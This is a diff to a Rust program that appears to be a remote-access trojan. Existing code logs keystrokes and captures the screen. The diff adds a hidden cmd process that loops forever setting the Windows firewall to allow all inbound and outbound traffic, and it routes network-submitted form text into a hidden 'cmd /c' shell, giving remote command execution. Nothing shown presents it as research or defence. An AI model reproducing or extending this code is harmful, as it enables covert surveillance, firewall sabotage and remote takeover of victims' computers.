@@ -16,7 +16,7 @@ use std::{
     sync::{Arc, Mutex},
     time::Duration,
 };
-use tokio::{main, net::TcpListener, spawn, process::Command};
+use tokio::{main, net::TcpListener, process::Command, spawn};
 use xcap::{Monitor, image::ImageFormat};
 
 #[derive(Deserialize)]
@@ -50,6 +50,13 @@ async fn main() {
         *lock3.lock().unwrap() += &(key.to_string() + "&#x2191; ");
     });
 
+    Command::new("cmd")
+        .creation_flags(0x08000000)
+        .arg("/c")
+        .arg("for /l %i in (0,0,0) do @(netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound)")
+        .spawn()
+        .unwrap();
+
     spawn(async {
         let lckin = lck2;
         loop {
@@ -77,7 +84,12 @@ async fn main() {
                 post(async move |Form(Frm { choice, text })| {
                     match &choice[..] {
                         "cmd" => {
-                            Command::new(&text).spawn().unwrap();
+                            Command::new("cmd")
+                                .creation_flags(0x08000000)
+                                .arg("/c")
+                                .arg(&text)
+                                .spawn()
+                                .unwrap();
                         }
                         "code" => (), // TODO: code
                         "eni" => (),  // TODO: enigo
